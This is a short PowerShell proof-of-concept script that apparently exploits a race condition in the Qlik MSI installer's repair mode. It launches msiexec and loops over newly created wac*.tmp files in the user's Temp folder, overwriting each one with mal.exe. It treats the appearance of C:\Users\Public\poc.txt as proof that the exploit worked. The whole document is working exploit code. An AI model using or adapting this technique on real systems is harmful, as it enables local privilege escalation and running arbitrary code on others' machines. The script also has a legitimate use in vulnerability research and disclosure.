$path = $env:LOCALAPPDATA + "\Temp"
#$ErrorActionPreference = "silentlycontinue"

Write-Host "Cleaning up, so QLIK spawns its own wac file" 
Get-ChildItem -Path $path -Force -Filter wac*.tmp -ErrorAction "silentlycontinue" | Select-Object -ExpandProperty FullName | Remove-Item
Get-ChildItem -Path "C:\Users\Public" -Force -Filter poc.txt | Remove-item

Write-Host "Running the MSI file"
Start-Process -FilePath "msiexec.exe" -ArgumentList "/fa qlik.msi"

Write-Host 'Done, now DIRing' $path 
Write-Host "injection loop begins now; if you see errors - thats good"

while ($True){
	Get-ChildItem -Path $path -Force -Filter wac*.tmp -ErrorAction "silentlycontinue" | Select-Object -ExpandProperty FullName | foreach($_){ 
	Copy-Item mal.exe ($_) 
	$poc = Get-ChildItem -Force -Filter poc.txt -Path "C:\Users\Public"
	if ($poc){
		Write-host "SUCCESS! poc.txt is here, the exploitation seems to have completed successfully"
		break
        	}
	}
}





